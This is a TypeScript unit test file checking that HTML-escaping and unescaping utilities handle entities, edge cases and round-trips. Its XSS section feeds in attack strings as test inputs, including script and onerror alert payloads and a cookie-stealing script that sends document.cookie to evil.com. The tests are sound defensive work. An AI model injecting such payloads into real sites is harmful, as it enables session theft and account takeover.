import { describe, it, expect } from 'vitest';

import { escapeHtml, unescapeHtml } from '@/utils/escapeHtml';

describe('escapeHtml', () => {
  describe('basic escaping', () => {
    it('should escape ampersands', () => {
      expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
    });
    
    it('should escape less than signs', () => {
      expect(escapeHtml('5 < 10')).toBe('5 &lt; 10');
    });
    
    it('should escape greater than signs', () => {
      expect(escapeHtml('10 > 5')).toBe('10 &gt; 5');
    });
    
    it('should escape double quotes', () => {
      expect(escapeHtml('He said "Hello"')).toBe('He said &quot;Hello&quot;');
    });
    
    it('should escape single quotes', () => {
      expect(escapeHtml("It's working")).toBe('It&#039;s working');
    });
  });
  
  describe('XSS prevention', () => {
    it('should escape script tags', () => {
      const input = '<script>alert("xss")</script>';
      const expected = '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
    
    it('should escape event handlers', () => {
      const input = '<img src=x onerror=alert("xss")>';
      const expected = '&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
    
    it('should escape javascript protocol', () => {
      const input = '<a href="javascript:alert(\'xss\')">Click</a>';
      const expected = '&lt;a href=&quot;javascript:alert(&#039;xss&#039;)&quot;&gt;Click&lt;/a&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
    
    it('should escape multiple attack vectors', () => {
      const input = '<script>document.location="http://evil.com?cookie="+document.cookie</script>';
      const expected = '&lt;script&gt;document.location=&quot;http://evil.com?cookie=&quot;+document.cookie&lt;/script&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
  });
  
  describe('edge cases', () => {
    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('');
    });
    
    it('should return empty string for null', () => {
      expect(escapeHtml(null as unknown as string)).toBe('');
    });
    
    it('should return empty string for undefined', () => {
      expect(escapeHtml(undefined as unknown as string)).toBe('');
    });
    
    it('should handle strings without special characters', () => {
      expect(escapeHtml('Hello World')).toBe('Hello World');
    });
    
    it('should handle multiple special characters', () => {
      const input = '<div class="test" data-value=\'123\'>Tom & Jerry > Batman</div>';
      const expected = '&lt;div class=&quot;test&quot; data-value=&#039;123&#039;&gt;Tom &amp; Jerry &gt; Batman&lt;/div&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
    
    it('should handle already escaped content', () => {
      const input = '&lt;div&gt;Already escaped&lt;/div&gt;';
      const expected = '&amp;lt;div&amp;gt;Already escaped&amp;lt;/div&amp;gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
    
    it('should handle unicode characters', () => {
      expect(escapeHtml('Hello 🌍')).toBe('Hello 🌍');
    });
    
    it('should handle Norwegian characters', () => {
      expect(escapeHtml('æøå ÆØÅ')).toBe('æøå ÆØÅ');
    });
  });
});

describe('unescapeHtml', () => {
  describe('basic unescaping', () => {
    it('should unescape ampersands', () => {
      expect(unescapeHtml('Tom &amp; Jerry')).toBe('Tom & Jerry');
    });
    
    it('should unescape less than signs', () => {
      expect(unescapeHtml('5 &lt; 10')).toBe('5 < 10');
    });
    
    it('should unescape greater than signs', () => {
      expect(unescapeHtml('10 &gt; 5')).toBe('10 > 5');
    });
    
    it('should unescape double quotes', () => {
      expect(unescapeHtml('He said &quot;Hello&quot;')).toBe('He said "Hello"');
    });
    
    it('should unescape single quotes', () => {
      expect(unescapeHtml('It&#039;s working')).toBe("It's working");
    });
  });
  
  describe('complex unescaping', () => {
    it('should unescape script tags', () => {
      const input = '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;';
      const expected = '<script>alert("xss")</script>';
      expect(unescapeHtml(input)).toBe(expected);
    });
    
    it('should handle multiple entities', () => {
      const input = '&lt;div class=&quot;test&quot;&gt;Tom &amp; Jerry &gt; Batman&lt;/div&gt;';
      const expected = '<div class="test">Tom & Jerry > Batman</div>';
      expect(unescapeHtml(input)).toBe(expected);
    });
  });
  
  describe('edge cases', () => {
    it('should handle empty strings', () => {
      expect(unescapeHtml('')).toBe('');
    });
    
    it('should return empty string for null', () => {
      expect(unescapeHtml(null as unknown as string)).toBe('');
    });
    
    it('should return empty string for undefined', () => {
      expect(unescapeHtml(undefined as unknown as string)).toBe('');
    });
    
    it('should handle strings without entities', () => {
      expect(unescapeHtml('Hello World')).toBe('Hello World');
    });
    
    it('should handle round-trip escaping', () => {
      const original = '<div>Test & "value"</div>';
      const escaped = escapeHtml(original);
      const unescaped = unescapeHtml(escaped);
      expect(unescaped).toBe(original);
    });
  });
});
